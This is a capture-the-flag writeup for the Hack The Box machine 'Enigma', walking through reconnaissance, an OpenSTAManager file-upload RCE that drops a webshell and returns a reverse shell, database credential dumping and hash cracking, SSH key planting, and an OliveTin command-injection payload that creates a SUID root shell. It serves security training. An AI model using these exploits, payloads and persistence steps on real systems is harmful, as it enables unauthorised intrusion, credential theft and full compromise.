# Enigma Linux Easy HTB Machine Writeup

#cve-2026-38751
## NMAP Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sC -sV -v 10.129.15.93          
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-02 19:23 +0700
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Initiating Ping Scan at 19:23
Scanning 10.129.15.93 [4 ports]
Completed Ping Scan at 19:23, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:23
Completed Parallel DNS resolution of 1 host. at 19:23, 0.50s elapsed
Initiating SYN Stealth Scan at 19:23
Scanning 10.129.15.93 [1000 ports]
Discovered open port 110/tcp on 10.129.15.93
Discovered open port 80/tcp on 10.129.15.93
Discovered open port 995/tcp on 10.129.15.93
Discovered open port 22/tcp on 10.129.15.93
Discovered open port 111/tcp on 10.129.15.93
Discovered open port 143/tcp on 10.129.15.93
Discovered open port 993/tcp on 10.129.15.93
Discovered open port 2049/tcp on 10.129.15.93
Completed SYN Stealth Scan at 19:23, 3.79s elapsed (1000 total ports)
Initiating Service scan at 19:23
Scanning 8 services on 10.129.15.93
Completed Service scan at 19:23, 13.37s elapsed (8 services on 1 host)
NSE: Script scanning 10.129.15.93.
Initiating NSE at 19:23
Completed NSE at 19:23, 5.78s elapsed
Initiating NSE at 19:23
Completed NSE at 19:23, 4.84s elapsed
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Nmap scan report for 10.129.15.93
Host is up (0.20s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
110/tcp  open  pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
| SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
|_SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
|_pop3-capabilities: SASL TOP STLS RESP-CODES PIPELINING CAPA AUTH-RESP-CODE UIDL
|_ssl-date: TLS randomness does not represent time
111/tcp  open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35973/tcp   mountd
|   100005  1,2,3      37951/udp   mountd
|   100005  1,2,3      43331/udp6  mountd
|   100005  1,2,3      58705/tcp6  mountd
|   100021  1,3,4      35263/tcp6  nlockmgr
|   100021  1,3,4      36364/udp   nlockmgr
|   100021  1,3,4      36825/tcp   nlockmgr
|   100021  1,3,4      43154/udp6  nlockmgr
|   100024  1          39250/udp6  status
|   100024  1          45907/tcp   status
|   100024  1          54340/udp   status
|   100024  1          56881/tcp6  status
|   100227  3           2049/tcp   nfs_acl
|_  100227  3           2049/tcp6  nfs_acl
143/tcp  open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: SASL-IR STARTTLS LOGIN-REFERRALS ENABLE have LITERAL+ listed IMAP4rev1 post-login LOGINDISABLEDA0001 ID OK capabilities Pre-login more IDLE
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
| SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
|_SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
| SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
|_SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
|_imap-capabilities: SASL-IR LOGIN-REFERRALS IDLE AUTH=PLAINA0001 LITERAL+ have IMAP4rev1 post-login Pre-login ID OK listed capabilities more ENABLE
|_ssl-date: TLS randomness does not represent time
995/tcp  open  ssl/pop3 Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=enigma
| Subject Alternative Name: DNS:enigma
| Issuer: commonName=enigma
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-18T20:33:33
| Not valid after:  2036-02-16T20:33:33
| MD5:     8361 ca20 2e4e dff6 6e90 1445 7458 9fc3
| SHA-1:   9f91 b6ed 85b4 517c 0421 c62e 167d 5631 daa6 5a40
|_SHA-256: 98a8 1f62 b59c 832a 162e 2394 9e41 1e08 46a0 f7c1 529f afcb ea15 eea5 ef52 bb70
|_pop3-capabilities: SASL(PLAIN) TOP CAPA RESP-CODES PIPELINING USER AUTH-RESP-CODE UIDL
2049/tcp open  nfs_acl  3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Initiating NSE at 19:23
Completed NSE at 19:23, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.99 seconds
           Raw packets sent: 1165 (51.236KB) | Rcvd: 1083 (43.340KB)

```
## Web Emuneration
After some hard-working emuneration steps: found `http://support_001.enigma.htb/`
Found an OpenStaManager portal
## Web Exploiting
After some researching, found this `CVE-2026-38751` which we can upload file, however this requires us to be logged in as administrator, so we can use `CVE-2026-27012` to promote a user to admin.
```bash
──(jameskaois㉿kali)-[~]
└─$ showmount -e 10.129.15.93
Export list for 10.129.15.93:
/srv/nfs/onboarding *

┌──(jameskaois㉿kali)-[~]
└─$ sudo mkdir -p /tmp/onboarding

┌──(jameskaois㉿kali)-[~]
└─$ sudo mount -t nfs -o vers=3,nolock 10.129.15.93:/srv/nfs/onboarding /tmp/onboarding

┌──(jameskaois㉿kali)-[~]
└─$ ls -la /tmp/onboarding
total 8
drwxr-xr-x  2 root root 4096 Feb 20 02:54 .
drwxrwxrwt 14 root root  360 Jul  2 19:43 ..
-rw-r--r--  1 root root 1751 Feb 20 02:53 New_Employee_Access.pdf
```
![[Screenshot 2026-07-02 at 19.46.28.png]]
![[Pasted image 20260702194930.png]]
Using the same creds to login as sarah, found the creds I have been found so hard we are admin now :) no need to promote the users:
![[Screenshot 2026-07-02 at 19.50.07.png]]
## Get user flag
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/enigma]
└─$   python3 exploit.py -u http://support_001.enigma.htb -U admin -P Ne3s4rtars78s --lhost 10.10.15.11 --lport 4444

[ CVE-2026-38751 — OpenSTAManager RCE ]

[*] Target: http://support_001.enigma.htb

[*] 1/4 Authenticating...
[+] Authenticated as: admin
[*] 2/4 Enabling module updates...
[+] Module updates enabled
[*] 3/4 Uploading malicious module...
[*] Malicious ZIP built in memory
[*] Upload → HTTP 500
[*] 4/4 Verifying webshell...
[+] Webshell active: http://support_001.enigma.htb/modules/shell/shell.php
[*] Sending payload to 10.10.15.11:4444
[*] Make sure your listener is ready: penelope -p 4444
[+] Payload delivered — check your Penelope listener

[?] Press Enter once your session is done to clean up...
[+] Webshell removed

┌──(jameskaois㉿kali)-[~]
└─$ nc -lvnp 4444               
listening on [any] 4444 ...
connect to [10.10.15.11] from (UNKNOWN) [10.129.15.93] 34294
bash: cannot set terminal process group (1558): Inappropriate ioctl for device
bash: no job control in this shell
www-data@enigma:~/html/openstamanager/modules/shell$ ls -la /home
ls -la /home
total 24
drwxr-xr-x  6 root  root  4096 Jun 23 14:14 .
drwxr-xr-x 23 root  root  4096 Jun 23 14:14 ..
drwxr-x---  4 haris haris 4096 Jun 23 14:21 haris
drwxr-x---  2 it    it    4096 Jun 23 14:14 it
drwxr-x---  3 kevin kevin 4096 Jun 23 14:14 kevin
drwxr-x---  3 sarah sarah 4096 Jun 23 14:14 sarah
www-data@enigma:~/html/openstamanager/modules/shell$ ls
ls
MODULE
shell.php
www-data@enigma:~/html/openstamanager/modules/shell$ 
```
In `/var/www/html/openstamanager/config.php` found:
```bash
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```
```bash
<r$ mysql -u brollin -p'Fri3nds@9099' openstamanager
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 53
Server version: 8.0.46-0ubuntu0.24.04.3 (Ubuntu)

Copyright (c) 2000, 2026, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> SELECT TABLE_NAME FROM information_schema.tables;
+---------------------------------------+
| TABLE_NAME                            |
+---------------------------------------+
| CHARACTER_SETS                        |
| CHECK_CONSTRAINTS                     |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMNS                               |
| COLUMNS_EXTENSIONS                    |
| COLUMN_STATISTICS                     |
| EVENTS                                |
| FILES                                 |
| INNODB_DATAFILES                      |
| INNODB_FOREIGN                        |
| INNODB_FOREIGN_COLS                   |
| INNODB_FIELDS                         |
| INNODB_TABLESPACES_BRIEF              |
| KEY_COLUMN_USAGE                      |
| KEYWORDS                              |
| PARAMETERS                            |
| PARTITIONS                            |
| REFERENTIAL_CONSTRAINTS               |
| RESOURCE_GROUPS                       |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMATA_EXTENSIONS                   |
| ST_SPATIAL_REFERENCE_SYSTEMS          |
| ST_UNITS_OF_MEASURE                   |
| ST_GEOMETRY_COLUMNS                   |
| STATISTICS                            |
| TABLE_CONSTRAINTS                     |
| TABLE_CONSTRAINTS_EXTENSIONS          |
| TABLES                                |
| TABLES_EXTENSIONS                     |
| TABLESPACES_EXTENSIONS                |
| TRIGGERS                              |
| VIEW_ROUTINE_USAGE                    |
| VIEW_TABLE_USAGE                      |
| VIEWS                                 |
| COLUMN_PRIVILEGES                     |
| ENGINES                               |
| OPTIMIZER_TRACE                       |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| SCHEMA_PRIVILEGES                     |
| TABLESPACES                           |
| TABLE_PRIVILEGES                      |
| USER_PRIVILEGES                       |
| processlist                           |
| session_account_connect_attrs         |
| global_status                         |
| session_status                        |
| global_variables                      |
| session_variables                     |
| variables_info                        |
| persisted_variables                   |
| ENABLED_ROLES                         |
| APPLICABLE_ROLES                      |
| ADMINISTRABLE_ROLE_AUTHORIZATIONS     |
| ROLE_COLUMN_GRANTS                    |
| ROLE_ROUTINE_GRANTS                   |
| ROLE_TABLE_GRANTS                     |
| USER_ATTRIBUTES                       |
| INNODB_SESSION_TEMP_TABLESPACES       |
| INNODB_VIRTUAL                        |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_BUFFER_PAGE                    |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMPMEM                         |
| INNODB_TRX                            |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_METRICS                        |
| INNODB_TEMP_TABLE_INFO                |
| INNODB_FT_DELETED                     |
| INNODB_TABLESTATS                     |
| INNODB_CMP                            |
| INNODB_TABLES                         |
| INNODB_FT_BEING_DELETED               |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_CMP_PER_INDEX                  |
| INNODB_FT_CONFIG                      |
| INNODB_CACHED_INDEXES                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_COLUMNS                        |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_INDEXES                        |
| INNODB_TABLESPACES                    |
| updates                               |
| an_tipianagrafiche_anagrafiche        |
| co_pianodeiconti1                     |
| co_pianodeiconti2                     |
| mg_unitamisura                        |
| zz_group_view                         |
| zz_permissions                        |
| zz_semaphores                         |
| zz_tokens                             |
| zz_group_module                       |
| zz_fields                             |
| zz_field_record                       |
| an_zone                               |
| fe_causali_pagamento_ritenuta         |
| fe_tipo_cassa                         |
| co_rivalse                            |
| co_ritenutaacconto                    |
| mg_piani_sconto                       |
| do_permessi                           |
| em_print_template                     |
| em_newsletters                        |
| em_email_receiver                     |
| em_email_upload                       |
| em_email_print                        |
| zz_api_resources                      |
| zz_check_user                         |
| zz_checklists                         |
| zz_notes                              |
| zz_operations                         |
| zz_hooks                              |
| co_fatturazione_contratti             |
| zz_cache                              |
| co_riferimenti_righe                  |
| in_interventi_tecnici_assegnati       |
| fe_tipi_ritenuta                      |
| mg_prezzi_articoli                    |
| zz_tasks_logs                         |
| my_impianto_componenti                |
| co_movimenti_modelli                  |
| co_banche                             |
| my_componenti_interventi              |
| em_list_receiver                      |
| em_newsletter_receiver                |
| mg_valori_attributi                   |
| mg_attributo_combinazione             |
| mg_articolo_attributo                 |
| em_accounts                           |
| do_documenti                          |
| mg_fornitore_articolo                 |
| zz_events                             |
| co_ritenuta_contributi                |
| co_dichiarazioni_intento              |
| in_fasceorarie_tipiintervento         |
| in_tariffe                            |
| zz_group_segment                      |
| an_mansioni                           |
| em_mansioni_template                  |
| zz_imports                            |
| in_righe_tipiinterventi               |
| mg_listini                            |
| my_componenti                         |
| zz_files_print                        |
| zz_checklist_items                    |
| mg_prodotti                           |
| co_scadenziario                       |
| co_promemoria                         |
| an_sedi_tecnici                       |
| zz_segments                           |
| em_lists                              |
| mg_combinazioni                       |
| zz_currencies                         |
| my_impianti_interventi                |
| zz_storage_adapters                   |
| an_sdi                                |
| zz_langs                              |
| zz_logs                               |
| an_nazioni_lang                       |
| zz_settings_lang                      |
| an_provenienze                        |
| an_provenienze_lang                   |
| an_regioni                            |
| an_regioni_lang                       |
| an_relazioni                          |
| an_relazioni_lang                     |
| an_settori                            |
| an_settori_lang                       |
| an_tipianagrafiche                    |
| an_tipianagrafiche_lang               |
| co_iva                                |
| co_iva_lang                           |
| co_pagamenti_lang                     |
| co_staticontratti_lang                |
| co_statidocumento                     |
| co_statidocumento_lang                |
| co_statipreventivi_lang               |
| co_tipidocumento                      |
| co_tipidocumento_lang                 |
| co_tipi_scadenze                      |
| co_tipi_scadenze_lang                 |
| do_categorie                          |
| do_categorie_lang                     |
| dt_aspettobeni                        |
| dt_aspettobeni_lang                   |
| dt_causalet                           |
| dt_causalet_lang                      |
| dt_porto                              |
| dt_porto_lang                         |
| dt_spedizione                         |
| dt_spedizione_lang                    |
| dt_statiddt_lang                      |
| dt_tipiddt                            |
| dt_tipiddt_lang                       |
| em_lists_lang                         |
| em_templates_lang                     |
| fe_modalita_pagamento                 |
| fe_modalita_pagamento_lang            |
| fe_natura                             |
| fe_natura_lang                        |
| fe_regime_fiscale                     |
| fe_regime_fiscale_lang                |
| fe_stati_documento                    |
| fe_stati_documento_lang               |
| fe_tipi_documento_lang                |
| in_fasceorarie_lang                   |
| in_statiintervento_lang               |
| in_tipiintervento_lang                |
| mg_attributi_lang                     |
| mg_causali_movimenti_lang             |
| mg_combinazioni_lang                  |
| or_statiordine_lang                   |
| or_tipiordine                         |
| or_tipiordine_lang                    |
| zz_cache_lang                         |
| zz_currencies_lang                    |
| zz_groups_lang                        |
| zz_group_module_lang                  |
| zz_hooks_lang                         |
| zz_imports_lang                       |
| zz_plugins_lang                       |
| zz_prints_lang                        |
| zz_segments_lang                      |
| zz_tasks_lang                         |
| zz_views_lang                         |
| zz_widgets_lang                       |
| zz_views                              |
| zz_widgets                            |
| in_interventi_tags                    |
| in_tags                               |
| in_interventi_tecnici                 |
| zz_groups                             |
| em_templates                          |
| fe_tipi_documento                     |
| zz_users                              |
| co_categorie_contratti_lang           |
| co_mandati_sepa                       |
| mg_articoli_lang                      |
| in_tipiintervento                     |
| co_pagamenti                          |
| zz_modules_lang                       |
| zz_modules                            |
| zz_plugins                            |
| co_pianodeiconti3                     |
| zz_settings                           |
| in_statiintervento                    |
| co_statipreventivi                    |
| co_staticontratti                     |
| dt_statiddt                           |
| or_statiordine                        |
| em_files_categories_template          |
| zz_categorie                          |
| zz_default_description                |
| zz_default_description_module         |
| zz_files_categories                   |
| zz_prints                             |
| zz_categorie_lang                     |
| zz_checks                             |
| co_provvigioni                        |
| zz_api_log                            |
| zz_tasks                              |
| co_righe_ammortamenti                 |
| em_email_attachment                   |
| mg_articoli_barcode                   |
| an_anagrafiche_agenti                 |
| an_assicurazione_crediti              |
| an_referenti                          |
| an_sedi                               |
| an_pagamenti_anagrafiche              |
| co_contratti_tipiintervento           |
| mg_scorte_sedi                        |
| mg_listini_articoli                   |
| my_impianti_contratti                 |
| zz_user_sedi                          |
| co_contratti                          |
| co_documenti                          |
| co_movimenti                          |
| dt_ddt                                |
| mg_movimenti                          |
| or_ordini                             |
| em_emails                             |
| in_fasceorarie                        |
| mg_causali_movimenti                  |
| co_categorie_contratti                |
| mg_attributi                          |
| zz_otp_tokens                         |
| an_anagrafiche                        |
| co_righe_contratti                    |
| dt_righe_ddt                          |
| co_righe_documenti                    |
| co_righe_preventivi                   |
| in_righe_interventi                   |
| or_righe_ordini                       |
| co_righe_promemoria                   |
| co_preventivi                         |
| co_stampecontabili                    |
| an_nazioni                            |
| zz_files                              |
| mg_articoli                           |
| my_impianti                           |
| in_interventi                         |
| zz_marche                             |
| zz_oauth2                             |
+---------------------------------------+
308 rows in set (0.02 sec)

mysql> 
```
```bash
mysql> SELECT username, password, email FROM zz_users;
+----------+--------------------------------------------------------------+------------------+
| username | password                                                     | email            |
+----------+--------------------------------------------------------------+------------------+
| admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |
| haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb |
+----------+--------------------------------------------------------------+------------------+
2 rows in set (0.00 sec)
mysql> 
```
Crack password:
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/enigma]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Created directory: /home/jameskaois/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bestfriends      (?)     
1g 0:00:00:07 DONE (2026-07-02 20:09) 0.1283g/s 86.26p/s 86.26c/s 86.26C/s gracie..kelly
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
Because the server doesn't allow ssh
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/enigma]
└─$ ssh haris@10.129.15.93 22
haris@10.129.15.93: Permission denied (publickey).
```
Use this:
```bash
<amanager$ printf 'bestfriends\n' | su haris -c 'id'
Password: uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)
<amanager$ printf 'bestfriends\n' | su haris -c 'ls -la /home/haris'
Password: total 32
drwxr-x--- 4 haris haris 4096 Jun 23 14:21 .
drwxr-xr-x 6 root  root  4096 Jun 23 14:14 ..
-rw------- 1 haris haris    0 Jun 23 14:21 .bash_history
-rw-r--r-- 1 haris haris  220 Feb 18 16:53 .bash_logout
-rw-r--r-- 1 haris haris 3771 Feb 18 16:53 .bashrc
drwx------ 2 haris haris 4096 Jun 23 14:14 .cache
drwx------ 3 haris haris 4096 Jun 23 14:14 mail
-rw-r--r-- 1 haris haris  807 Feb 18 16:53 .profile
-rw-r----- 1 root  haris   33 Jul  2 12:22 user.txt
< 'bestfriends\n' | su haris -c 'cat /home/haris/user.txt'
Password: 160f4db5cb7b9c03fa2dec86b60a5b98
```
## Privilege Escalation
Use the same method to add public key to ssh to the machine:
```bash
jameskaois@kali: $ ssh-keygen -t rsa -b 4096 -C "jameskaois@kali" -f ~/.ssh/id_rsa
$ mkdir -p /home/haris/.ssh
$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDJ8vzmO29e4vYkhktTBwRUGczkcgD86N0YVrm3FL3hjHaZe5kaSxHIq+HU/qjfx7CD1YKqIx/y0KZWYfTaQQzsyCaRLznrXZlnNaeIEgZjjS329HSF232CBMjqO8Lizio1ZrmAQ0zUtNj6URVM2FiM0yvtEtCD/VyVqYjrEj7//q3yfWnj5sn1kkk+juDDd10UiZUowY5DQduN17qWwAsark8pwWy1TubGsZZ+wKmm/EWC1Q+0chw0GEScBKpWp6qQJTQz8sywF70ewcncaUu+rYtN1TC3vjQNwKOvpM4R/z4gkEl8Kg+U6z3ubersomExz+gwfUn5kSHppfWHVD6AusMb0rbvZOTAqsHlnf6gDRU9VGEy2VI8OTbxx4F0HCBoMh5uc1hCT3exUBJHJkXuVtntPFDtSX5xtGhiBLzAAyZRj6pMaU4XBxeyviQtyUk+ivD8zjHtk3hUBl+Wkn3mI+7WH6MR0Ay73mHzsiUD+pI5TJePFmW1OP2TPJ8bkF8wQ3HrX63wnZO3Cv2d7oOUUHCkqKDUyz1RKbzEmTTu4yZFhkdfUvfmqu6Daj4W1STXZi85BypuGgPpXgty1wOfYVRmqddteh2EeWgNCUeJMq7zmS+mx9MNSPBo+gKDsGNcP/3tKJ8hzU2Lr3JvimYYEmuXTX1Qk52apZGVD/mTIw== jameskaois@kali" >> /home/haris/.ssh/authorized_keys
$ chmod 700 /home/haris/.ssh 
$ chmod 600 /home/haris/.ssh/authorized_keys
$ ssh haris@10.129.15.93 -i ~/.ssh/id_rsa
```
```bash
haris@enigma:~$ ss -tulnp
Netid     State      Recv-Q     Send-Q         Local Address:Port          Peer Address:Port    Process    
udp       UNCONN     0          0                 127.0.0.54:53                 0.0.0.0:*                  
udp       UNCONN     0          0              127.0.0.53%lo:53                 0.0.0.0:*                  
udp       UNCONN     0          0                    0.0.0.0:68                 0.0.0.0:*                  
udp       UNCONN     0          0                    0.0.0.0:111                0.0.0.0:*                  
udp       UNCONN     0          0                    0.0.0.0:35398              0.0.0.0:*                  
udp       UNCONN     0          0                  127.0.0.1:891                0.0.0.0:*                  
udp       UNCONN     0          0                    0.0.0.0:37951              0.0.0.0:*                  
udp       UNCONN     0          0                    0.0.0.0:54340              0.0.0.0:*                  
udp       UNCONN     0          0                    0.0.0.0:36364              0.0.0.0:*                  
udp       UNCONN     0          0                    0.0.0.0:54942              0.0.0.0:*                  
udp       UNCONN     0          0                       [::]:111                   [::]:*                  
udp       UNCONN     0          0                       [::]:41078                 [::]:*                  
udp       UNCONN     0          0                       [::]:43154                 [::]:*                  
udp       UNCONN     0          0                       [::]:43277                 [::]:*                  
udp       UNCONN     0          0                       [::]:43331                 [::]:*                  
udp       UNCONN     0          0                       [::]:39250                 [::]:*                  
tcp       LISTEN     0          4096                 0.0.0.0:22                 0.0.0.0:*                  
tcp       LISTEN     0          64                   0.0.0.0:2049               0.0.0.0:*                  
tcp       LISTEN     0          511                  0.0.0.0:80                 0.0.0.0:*                  
tcp       LISTEN     0          100                  0.0.0.0:110                0.0.0.0:*                  
tcp       LISTEN     0          4096                 0.0.0.0:111                0.0.0.0:*                  
tcp       LISTEN     0          100                  0.0.0.0:143                0.0.0.0:*                  
tcp       LISTEN     0          4096                 0.0.0.0:49447              0.0.0.0:*                  
tcp       LISTEN     0          4096           127.0.0.53%lo:53                 0.0.0.0:*                  
tcp       LISTEN     0          70                 127.0.0.1:33060              0.0.0.0:*                  
tcp       LISTEN     0          4096                 0.0.0.0:45907              0.0.0.0:*                  
tcp       LISTEN     0          100                127.0.0.1:25                 0.0.0.0:*                  
tcp       LISTEN     0          100                  0.0.0.0:993                0.0.0.0:*                  
tcp       LISTEN     0          100                  0.0.0.0:995                0.0.0.0:*                  
tcp       LISTEN     0          4096                 0.0.0.0:35973              0.0.0.0:*                  
tcp       LISTEN     0          4096                 0.0.0.0:46217              0.0.0.0:*                  
tcp       LISTEN     0          4096               127.0.0.1:1337               0.0.0.0:*                  
tcp       LISTEN     0          151                127.0.0.1:3306               0.0.0.0:*                  
tcp       LISTEN     0          64                   0.0.0.0:36825              0.0.0.0:*                  
tcp       LISTEN     0          4096              127.0.0.54:53                 0.0.0.0:*                  
tcp       LISTEN     0          4096                    [::]:22                    [::]:*                  
tcp       LISTEN     0          64                      [::]:2049                  [::]:*                  
tcp       LISTEN     0          511                     [::]:80                    [::]:*                  
tcp       LISTEN     0          100                     [::]:110                   [::]:*                  
tcp       LISTEN     0          4096                    [::]:111                   [::]:*                  
tcp       LISTEN     0          100                     [::]:143                   [::]:*                  
tcp       LISTEN     0          64                      [::]:35263                 [::]:*                  
tcp       LISTEN     0          100                     [::]:993                   [::]:*                  
tcp       LISTEN     0          100                     [::]:995                   [::]:*                  
tcp       LISTEN     0          4096                    [::]:56555                 [::]:*                  
tcp       LISTEN     0          4096                    [::]:40203                 [::]:*                  
tcp       LISTEN     0          4096                    [::]:58705                 [::]:*                  
tcp       LISTEN     0          4096                    [::]:56881                 [::]:*                  
tcp       LISTEN     0          100                    [::1]:25                    [::]:*                  
haris@enigma:~$ 
```
Saw `1337` port which is mysterious, forward the port and found **OliveTin 3000.10.0** dashboard, found `CVE-2026-27626`
## Get root flag
Test POC:
```bash
┌──(jameskaois㉿kali)-[~]
└─$ curl -X POST http://localhost:1337/api/StartAction \
  -H "Content-Type: application/json" \
  -d '{"actionId": "run-command", "arguments": [{"name": "pass", "value": "'; id; echo '"}]}'
{"code":"invalid_argument","message":"unmarshal message: unmarshal into *apiv1.StartActionRequest: proto: unexpected EOF"}uid=1000(jameskaois) gid=1000(jameskaois) groups=1000(jameskaois),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),102(scanner),112(bluetooth),117(lpadmin),119(wireshark),123(kaboxer)
"}]}
```
The exact `id` run on `jameskaois@kali`, use password field in Backup Database UI Block to execute the CVE:
```
x'; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash; #
```
```bash
haris@enigma:~$ /tmp/rootbash -p
rootbash-5.2# id
uid=1000(haris) gid=1000(haris) euid=0(root) groups=1000(haris),100(users)
rootbash-5.2# ls -la /root
total 44
drwx------  8 root root 4096 Jul  2 12:22 .
drwxr-xr-x 23 root root 4096 Jun 23 14:14 ..
-rw-------  1 root root    0 Jun 23 14:20 .bash_history
-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
drwx------  5 root root 4096 Jun 23 14:14 .cache
drwxr-xr-x  6 root root 4096 Jun 23 14:14 .config
drwxr-xr-x  3 root root 4096 Jun 23 14:14 .local
lrwxrwxrwx  1 root root    9 May 22 00:33 .mysql_history -> /dev/null
drwxr-xr-x  4 root root 4096 Jun 23 14:14 .npm
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
drwx------  2 root root 4096 Jun 23 14:14 .ssh
drwxr-xr-x  3 root root 4096 Jun 23 14:14 .yarn
-rw-r-----  1 root root   33 Jul  2 12:22 root.txt
rootbash-5.2# cat /root/root.txt
644c67451b8e8985f7e91e0a5feef92b
```